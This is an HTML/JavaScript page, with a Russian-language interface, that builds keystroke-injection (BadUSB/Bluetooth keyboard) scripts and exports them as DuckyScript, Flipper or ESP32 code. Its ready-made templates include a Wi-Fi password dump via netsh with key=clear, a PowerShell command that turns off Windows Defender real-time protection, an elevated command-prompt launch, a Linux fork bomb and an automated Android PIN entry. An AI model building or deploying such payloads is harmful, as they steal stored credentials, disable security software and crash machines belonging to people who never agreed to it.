<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BT Script Builder MEGA ULTRA</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg-dark: #0a0e1a;
            --bg-panel: #141a2e;
            --accent-cyan: #00d4ff;
            --accent-green: #00ff88;
            --accent-purple: #bd93f9;
            --accent-orange: #ff9f43;
            --accent-red: #ff5555;
            --text-main: #ffffff;
            --text-dim: #a0aec0;
            --danger: #ee5253;
            --border: #2a3f5f;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-dark);
            color: var(--text-main);
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        #background-canvas {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1; opacity: 0.15; pointer-events: none; 
        }

        header {
            padding: 10px 12px;
            background: rgba(10, 14, 26, 0.95);
            border-bottom: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            gap: 10px;
            backdrop-filter: blur(10px);
            z-index: 100;
        }

        .header-top { display: flex; justify-content: space-between; align-items: center; }
        .header-btns { display: flex; flex-wrap: wrap; gap: 4px; justify-content: flex-end; }

        h1 { font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent-cyan); text-shadow: 0 0 8px var(--accent-cyan); }

        .btn {
            padding: 6px 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;
            font-size: 9px; font-weight: bold; cursor: pointer; border: 1px solid transparent; text-transform: uppercase;
        }

        .btn-gen { background: var(--accent-cyan); color: var(--bg-dark); }
        .btn-reset { background: rgba(238, 82, 83, 0.1); color: var(--danger); border-color: var(--danger); }
        .btn-info { background: rgba(0, 255, 136, 0.1); color: var(--accent-green); border-color: var(--accent-green); }
        .btn-analyze { background: rgba(189, 147, 249, 0.1); color: var(--accent-purple); border-color: var(--accent-purple); }

        .toolbar-label { font-size: 8px; color: var(--accent-cyan); padding: 8px 12px 2px; font-family: 'JetBrains Mono'; text-transform: uppercase; opacity: 0.7; letter-spacing: 1px; }
        
        .toolbar-container { background: var(--bg-panel); border-bottom: 1px solid var(--border); overflow-x: auto; padding-bottom: 8px; z-index: 90; }
        .toolbar { display: flex; gap: 6px; padding: 4px 8px; }

        .cmd-btn {
            background: rgba(0, 212, 255, 0.05); border: 1px solid var(--border); color: var(--accent-cyan);
            padding: 8px 12px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 10px; white-space: nowrap; cursor: pointer;
        }

        .tpl-btn { background: rgba(189, 147, 249, 0.05); border: 1px solid var(--accent-purple); color: var(--accent-purple); }
        .tpl-orange { border-color: var(--accent-orange); color: var(--accent-orange); }
        .tpl-red { border-color: var(--accent-red); color: var(--accent-red); }

        .script-area { flex: 1; overflow-y: auto; padding: 12px; z-index: 50; }
        .command-item { background: var(--bg-panel); border: 1px solid var(--border); margin-bottom: 6px; padding: 10px; border-radius: 6px; display: flex; align-items: center; gap: 10px; }
        .command-text { flex: 1; font-family: 'JetBrains Mono', monospace; font-size: 10px; line-height: 1.4; }
        .command-text b { color: var(--accent-cyan); }
        .drag-handle { color: var(--text-dim); font-size: 18px; padding: 0 5px; cursor: move; }
        .delete-btn { background: none; border: 1px solid var(--danger); color: var(--danger); width: 24px; height: 24px; border-radius: 4px; font-weight: bold; cursor: pointer; }

        footer { padding: 10px; background: var(--bg-panel); border-top: 1px solid var(--border); z-index: 100; }
        .cyber-select { width: 100%; background: var(--bg-dark); border: 1px solid var(--border); color: white; padding: 10px; border-radius: 4px; font-size: 12px; -webkit-appearance: none; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); z-index: 2000; align-items: center; justify-content: center; padding: 20px; }
        .modal-content { background: var(--bg-panel); border: 1px solid var(--accent-cyan); padding: 15px; border-radius: 8px; width: 100%; max-width: 380px; max-height: 85vh; overflow-y: auto; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); }
        .modal h2 { font-size: 13px; font-family: 'JetBrains Mono', monospace; color: var(--accent-cyan); margin-bottom: 12px; text-transform: uppercase; border-bottom: 1px solid var(--border); padding-bottom: 5px; }

        .cyber-textarea { width: 100%; height: 240px; background: #000; border: 1px solid var(--border); color: var(--accent-green); padding: 10px; font-family: 'JetBrains Mono'; font-size: 10px; margin-bottom: 10px; resize: none; border-radius: 4px; }
        .cyber-input { width: 100%; background: var(--bg-dark); border: 1px solid var(--accent-cyan); color: white; padding: 12px; border-radius: 4px; margin-bottom: 12px; font-size: 16px; }

        .analysis-step { margin-bottom: 8px; padding-left: 10px; border-left: 2px solid var(--accent-purple); font-size: 10px; font-family: 'JetBrains Mono'; color: var(--text-dim); }
        .analysis-step b { color: var(--accent-cyan); }
    </style>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.3.2/pixi.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sortablejs@latest/Sortable.min.js"></script>
</head>
<body>
    <canvas id="background-canvas"></canvas>

    <header>
        <div class="header-top">
            <h1>BT SCRIPT <span style="color:var(--accent-green)">MEGA ULTRA</span></h1>
            <div class="header-btns">
                <button id="help-btn" class="btn btn-info">ИНФО</button>
                <button id="analyze-btn" class="btn btn-analyze">АНАЛИЗ</button>
                <button id="generate-btn" class="btn btn-gen">СГЕНЕРИРОВАТЬ</button>
                <button id="reset-btn" class="btn btn-reset">СБРОС</button>
            </div>
        </div>
    </header>

    <div class="toolbar-container">
        <div class="toolbar-label">Основы</div>
        <div class="toolbar">
            <button class="cmd-btn" data-type="STRING">STRING</button>
            <button class="cmd-btn" data-type="DELAY">DELAY</button>
            <button class="cmd-btn" data-type="ENTER">ENTER</button>
            <button class="cmd-btn" data-type="GUI">GUI</button>
            <button class="cmd-btn" data-type="CTRL">CTRL</button>
            <button class="cmd-btn" data-type="ALT">ALT</button>
            <button class="cmd-btn" data-type="SHIFT">SHIFT</button>
            <button class="cmd-btn" data-type="ESC">ESC</button>
            <button class="cmd-btn" data-type="TAB">TAB</button>
        </div>

        <div class="toolbar-label">Windows (PC)</div>
        <div class="toolbar">
            <button class="cmd-btn tpl-btn" data-tpl="win_cmd">Admin CMD</button>
            <button class="cmd-btn tpl-btn" data-tpl="win_wifi">WiFi Stealer</button>
            <button class="cmd-btn tpl-btn" data-tpl="win_defender">Off Defender</button>
            <button class="cmd-btn tpl-btn" data-tpl="win_sysinfo">Sys Info</button>
            <button class="cmd-btn tpl-btn" data-tpl="win_lock">Lock PC</button>
        </div>

        <div class="toolbar-label">macOS / Apple</div>
        <div class="toolbar">
            <button class="cmd-btn tpl-btn tpl-orange" data-tpl="mac_term">Mac Terminal</button>
            <button class="cmd-btn tpl-btn tpl-orange" data-tpl="mac_say">Mac Say Hello</button>
            <button class="cmd-btn tpl-btn tpl-orange" data-tpl="mac_calc">Mac Calculator</button>
            <button class="cmd-btn tpl-btn tpl-orange" data-tpl="ios_shot">iOS Screenshot</button>
            <button class="cmd-btn tpl-btn tpl-orange" data-tpl="ios_cam">iOS Camera</button>
        </div>

        <div class="toolbar-label">Linux / Ubuntu</div>
        <div class="toolbar">
            <button class="cmd-btn tpl-btn" style="border-color:#e67e22; color:#e67e22;" data-tpl="lin_term">Linux Term</button>
            <button class="cmd-btn tpl-btn" style="border-color:#e67e22; color:#e67e22;" data-tpl="lin_update">Sys Update</button>
            <button class="cmd-btn tpl-btn" style="border-color:#e67e22; color:#e67e22;" data-tpl="lin_bomb">Fork Bomb</button>
        </div>

        <div class="toolbar-label">Android / Mobile</div>
        <div class="toolbar">
            <button class="cmd-btn tpl-btn" style="border-color:var(--accent-green); color:var(--accent-green);" data-tpl="and_pin">PIN 7878</button>
            <button class="cmd-btn tpl-btn" style="border-color:var(--accent-green); color:var(--accent-green);" data-tpl="and_yt">Open YouTube</button>
            <button class="cmd-btn tpl-btn" style="border-color:var(--accent-green); color:var(--accent-green);" data-tpl="and_lock">Lock Device</button>
        </div>

        <div class="toolbar-label">Приколы (Pranks)</div>
        <div class="toolbar">
            <button class="cmd-btn tpl-btn tpl-red" data-tpl="p_rick">RickRoll</button>
            <button class="cmd-btn tpl-btn tpl-red" data-tpl="p_fakeup">Fake Windows Update</button>
            <button class="cmd-btn tpl-btn tpl-red" data-tpl="p_calc">Calc Spam</button>
        </div>
    </div>

    <main class="script-area">
        <div id="command-list">
            <div id="empty-hint" style="text-align: center; color: var(--text-dim); margin-top: 60px; font-size: 11px; font-family: 'JetBrains Mono'; opacity: 0.5;">[ СИСТЕМА ГОТОВА К РАБОТЕ ]</div>
        </div>
    </main>

    <footer>
        <select id="export-format" class="cyber-select">
            <option value="ducky">DuckyScript (.txt)</option>
            <option value="esplit">ESPlit / Dckuino (Convert)</option>
            <option value="flipper">Flipper Zero (.sub)</option>
            <option value="esp32">Arduino ESP32 (.ino)</option>
        </select>
    </footer>

    <div id="help-modal" class="modal"><div class="modal-content"><h2>Шпаргалка</h2><div id="h_body"></div><button onclick="closeModals()" class="btn btn-gen" style="width:100%; margin-top:15px;">ОК</button></div></div>
    
    <div id="analyze-modal" class="modal"><div class="modal-content"><h2>Анализ Скрипта</h2><div id="analysis-body"></div><button onclick="closeModals()" class="btn btn-analyze" style="width:100%; margin-top:15px;">ПОНЯТНО</button></div></div>

    <div id="result-modal" class="modal"><div class="modal-content"><h2>Результат</h2><textarea id="result-output" class="cyber-textarea" readonly></textarea><button id="copy-btn" class="btn btn-gen" style="width:100%;">КОПИРОВАТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ЗАКРЫТЬ</button></div></div>
    
    <div id="edit-modal" class="modal"><div class="modal-content"><h2 id="edit-modal-title">ВВОД</h2><input type="text" id="edit-input" class="cyber-input"><button id="save-edit-btn" class="btn btn-gen" style="width:100%;">ДОБАВИТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ОТМЕНА</button></div></div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            let scriptCommands = [];
            let idCounter = 0;
            const commandList = document.getElementById('command-list');
            const editModal = document.getElementById('edit-modal');
            const editInput = document.getElementById('edit-input');

            // Сортировка
            if (typeof Sortable !== 'undefined') {
                new Sortable(commandList, { 
                    animation: 150, handle: '.drag-handle', 
                    onEnd: (evt) => {
                        const movedItem = scriptCommands.splice(evt.oldIndex, 1)[0];
                        scriptCommands.splice(evt.newIndex, 0, movedItem);
                    }
                });
            }

            function render() {
                const hint = document.getElementById('empty-hint');
                if (scriptCommands.length === 0) {
                    commandList.innerHTML = '';
                    if (hint) { hint.style.display = 'block'; commandList.appendChild(hint); }
                    return;
                }
                if (hint) hint.style.display = 'none';
                commandList.innerHTML = '';
                scriptCommands.forEach((cmd, index) => {
                    const div = document.createElement('div');
                    div.className = 'command-item';
                    div.innerHTML = `
                        <span class="drag-handle">☰</span>
                        <span class="command-text"><b>${cmd.type}</b> ${cmd.value ? ': ' + cmd.value : ''}</span>
                        <button class="delete-btn" onclick="deleteCmd(${index})">×</button>
                    `;
                    commandList.appendChild(div);
                });
            }

            function addCommand(type, value = null) {
                scriptCommands.push({ id: idCounter++, type, value });
                render();
            }

            // ШАБЛОНЫ
            function addTemplate(tpl) {
                switch(tpl) {
                    case 'win_cmd':
                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'powershell Start-Process cmd -Verb runAs'); addCommand('ENTER');
                        break;
                    case 'win_wifi':
                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'cmd /k netsh wlan show profile name=* key=clear'); addCommand('ENTER');
                        break;
                    case 'win_defender':
                        addCommand('GUI', 'r'); addCommand('DELAY', '600'); addCommand('STRING', 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'); addCommand('ENTER');
                        break;
                    case 'win_sysinfo':
                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'cmd /k systeminfo && pause'); addCommand('ENTER');
                        break;
                    case 'win_lock':
                        addCommand('GUI', 'l');
                        break;
                    case 'mac_term':
                        addCommand('GUI', ' '); addCommand('DELAY', '300'); addCommand('STRING', 'terminal'); addCommand('ENTER');
                        break;
                    case 'mac_say':
                        addCommand('GUI', ' '); addCommand('DELAY', '300'); addCommand('STRING', 'terminal'); addCommand('ENTER'); addCommand('DELAY', '1000'); addCommand('STRING', 'say "Hello Hacker"'); addCommand('ENTER');
                        break;
                    case 'mac_calc':
                        addCommand('GUI', ' '); addCommand('DELAY', '300'); addCommand('STRING', 'calculator'); addCommand('ENTER');
                        break;
                    case 'ios_shot':
                        addCommand('GUI', 'SHIFT'); addCommand('STRING', '3');
                        break;
                    case 'ios_cam':
                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '400'); addCommand('STRING', 'camera'); addCommand('ENTER');
                        break;
                    case 'lin_term':
                        addCommand('CTRL', 'ALT'); addCommand('STRING', 't');
                        break;
                    case 'lin_update':
                        addCommand('CTRL', 'ALT'); addCommand('STRING', 't'); addCommand('DELAY', '800'); addCommand('STRING', 'sudo apt update && sudo apt upgrade -y'); addCommand('ENTER');
                        break;
                    case 'lin_bomb':
                        addCommand('CTRL', 'ALT'); addCommand('STRING', 't'); addCommand('DELAY', '500'); addCommand('STRING', ':(){ :|:& };:'); addCommand('ENTER');
                        break;
                    case 'and_pin':
                        addCommand('STRING', ' '); addCommand('DELAY', '1000');
                        addCommand('STRING', '7'); addCommand('DELAY', '500'); addCommand('STRING', '8'); addCommand('DELAY', '500');
                        addCommand('STRING', '7'); addCommand('DELAY', '500'); addCommand('STRING', '8'); addCommand('ENTER');
                        break;
                    case 'and_yt':
                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '500'); addCommand('STRING', 'youtube.com'); addCommand('ENTER');
                        break;
                    case 'and_lock':
                        addCommand('GUI', 'L');
                        break;
                    case 'p_rick':
                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'); addCommand('ENTER');
                        break;
                    case 'p_fakeup':
                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'https://fakescreen.com/windows-10-update/'); addCommand('ENTER'); addCommand('DELAY', '500'); addCommand('F11');
                        break;
                    case 'p_calc':
                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'powershell for($i=0;$i-lt 20;$i++){start calc}'); addCommand('ENTER');
                        break;
                }
            }

            document.querySelectorAll('.cmd-btn').forEach(btn => {
                btn.onclick = () => {
                    if (btn.classList.contains('tpl-btn')) addTemplate(btn.dataset.tpl);
                    else {
                        const type = btn.dataset.type;
                        if (type === 'STRING' || type === 'DELAY') {
                            document.getElementById('edit-modal-title').textContent = type;
                            editInput.value = ''; editModal.style.display = 'flex';
                            setTimeout(() => editInput.focus(), 150);
                        } else addCommand(type);
                    }
                };
            });

            document.getElementById('save-edit-btn').onclick = () => {
                const val = editInput.value.trim();
                if(!val) return;
                addCommand(document.getElementById('edit-modal-title').textContent, val);
                closeModals();
            };

            window.deleteCmd = (index) => { scriptCommands.splice(index, 1); render(); };
            window.closeModals = () => { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); };

            // АНАЛИЗАТОР
            document.getElementById('analyze-btn').onclick = () => {
                if(scriptCommands.length === 0) return alert("Добавьте команды");
                const body = document.getElementById('analysis-body');
                body.innerHTML = '';
                scriptCommands.forEach((cmd, i) => {
                    let desc = "";
                    const v = cmd.value ? cmd.value.toLowerCase() : "";
                    if (cmd.type === 'STRING') {
                        if (v.includes('netsh wlan')) desc = "КРАЖА ПАРОЛЕЙ: Попытка выгрузить ключи Wi-Fi из памяти.";
                        else if (v.includes('powershell')) desc = "ЗАПУСК POWERSHELL: Выполнение системных скриптов Windows.";
                        else if (v.includes('set-mppreference')) desc = "КРИТИЧЕСКОЕ: Отключение системного антивируса!";
                        else if (v.includes('http')) desc = "БРАУЗЕР: Переход на указанную веб-ссылку.";
                        else if (v.includes('sudo')) desc = "ROOT: Попытка выполнить команду с правами администратора.";
                        else desc = `ВВОД ТЕКСТА: "${cmd.value}".`;
                    } else if (cmd.type === 'DELAY') desc = `ОЖИДАНИЕ: Пауза в ${cmd.value} мс для стабильности.`;
                    else desc = `КЛАВИША: Нажатие системной кнопки ${cmd.type}.`;
                    
                    const step = document.createElement('div');
                    step.className = 'analysis-step';
                    step.innerHTML = `<b>Шаг ${i+1}:</b> ${desc}`;
                    body.appendChild(step);
                });
                document.getElementById('analyze-modal').style.display = 'flex';
            };

            // ГЕНЕРАТОР (С ПОДДЕРЖКОЙ ESPLIT)
            document.getElementById('generate-btn').onclick = () => {
                if(scriptCommands.length === 0) return;
                const format = document.getElementById('export-format').value;
                let output = "";

                if (format === 'ducky') {
                    output = scriptCommands.map(c => (c.type === 'STRING' || c.type === 'DELAY') ? c.type + ' ' + (c.value || '') : c.type).join('\n');
                } else if (format === 'esplit') {
                    // НОВЫЙ ФОРМАТ ESPLit / Dckuino
                    output = "Rem:Generated by BT Builder Mega\nRem:-----\n";
                    output += scriptCommands.map(c => {
                        if (c.type === 'STRING') return `Print:${c.value}`;
                        if (c.type === 'DELAY') return `CustomDelay:${c.value}`;
                        if (c.type === 'GUI') return `Press:131${c.value ? '\nPrint:' + c.value : ''}`;
                        if (c.type === 'ENTER') return `Press:176`;
                        if (c.type === 'CTRL') return `Press:128`;
                        if (c.type === 'ALT') return `Press:130`;
                        if (c.type === 'SHIFT') return `Press:129`;
                        if (c.type === 'TAB') return `Press:179`;
                        if (c.type === 'ESC') return `Press:177`;
                        return `// Command ${c.type} not mapped`;
                    }).join('\n');
                } else if (format === 'flipper') {
                    output = "Filetype: Flipper SubGhz Key File\nVersion: 1\n# BadBT Script\n";
                    output += scriptCommands.map(c => (c.type === 'STRING' || c.type === 'DELAY') ? c.type + ' ' + (c.value || '') : c.type).join('\n');
                } else if (format === 'esp32') {
                    output = "#include <BleKeyboard.h>\nBleKeyboard bleKeyboard;\n\nvoid setup() {\n  bleKeyboard.begin();\n}\n\nvoid loop() {\n  if(bleKeyboard.isConnected()) {\n    delay(1000);\n";
                    scriptCommands.forEach(c => {
                        if (c.type === 'STRING') output += `    bleKeyboard.print("${c.value}");\n`;
                        else if (c.type === 'DELAY') output += `    delay(${c.value});\n`;
                        else if (c.type === 'ENTER') output += `    bleKeyboard.write(KEY_RETURN);\n`;
                    });
                    output += "    while(1) delay(1000);\n  }\n}";
                }

                document.getElementById('result-output').value = output;
                document.getElementById('result-modal').style.display = 'flex';
            };

            document.getElementById('copy-btn').onclick = () => {
                document.getElementById('result-output').select();
                document.execCommand('copy');
                alert('Скрипт скопирован!');
            };

            document.getElementById('reset-btn').onclick = () => { if(confirm('Очистить всё?')) { scriptCommands = []; render(); } };
            
            document.getElementById('help-btn').onclick = () => {
                document.getElementById('h_body').innerHTML = `
                    <b>АНАЛИЗ:</b> Расшифровка действий скрипта.<br>
                    <b>ШАБЛОНЫ:</b> Готовые команды для Windows, iOS, Linux и др.<br>
                    <b>ESPLIT:</b> Новый формат для Wi-Fi BadUSB модулей.
                `;
                document.getElementById('help-modal').style.display = 'flex';
            };

            // Фон
            try {
                const canvas = document.getElementById('background-canvas');
                const pixiApp = new PIXI.Application({ view: canvas, resizeTo: window, backgroundAlpha: 0 });
                const grid = new PIXI.Graphics();
                pixiApp.stage.addChild(grid);
                pixiApp.ticker.add(() => {
                    grid.clear(); grid.lineStyle(1, 0x00d4ff, 0.03);
                    for(let i=0; i<window.innerWidth; i+=50) { grid.moveTo(i, 0); grid.lineTo(i, window.innerHeight); }
                    for(let i=0; i<window.innerHeight; i+=50) { grid.moveTo(0, i); grid.lineTo(window.innerWidth, i); }
                });
            } catch(e) {}
        });
    </script>
</body>
</html>
